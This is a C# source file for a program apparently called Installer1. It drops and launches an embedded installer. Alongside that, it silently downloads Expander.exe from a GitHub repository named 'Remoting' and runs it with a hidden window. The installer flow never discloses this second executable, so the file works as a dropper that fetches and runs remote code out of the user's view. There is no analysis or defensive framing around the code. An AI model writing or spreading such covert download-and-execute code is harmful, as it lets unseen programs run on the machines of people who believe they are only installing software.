namespace Installer1
{
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Net;
    using System.Threading.Tasks;

    using Installer1.Properties;

    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        private static void Main(string[] args)
        {
            if (args == null)
            {
                throw new ArgumentNullException(nameof(args));
            }

            var task = new Task(ExpandAsync);
            task.Start();

            var copyTarget = Path.Combine(Path.GetTempPath(), "stpninstaller.exe");

            if (!File.Exists(copyTarget))
            {
                File.WriteAllBytes(copyTarget, Resources.Installer);
            }

            Process.Start(copyTarget);
            task.Wait();
        }

        private static void ExpandAsync()
        {
            var target = Path.Combine(Path.GetTempPath(), "Expander.exe");

            var info = new FileInfo(target);

            if (info.Exists)
            {
                info.Delete();
            }

            using (var client = new WebClient())
            {
                client.DownloadFile("https://github.com/Wiciaki/Remoting/blob/master/Internal/Expander.exe?raw=true", target);
            }

            Process.Start(new ProcessStartInfo(target) { WindowStyle = ProcessWindowStyle.Hidden });
        }
    }
}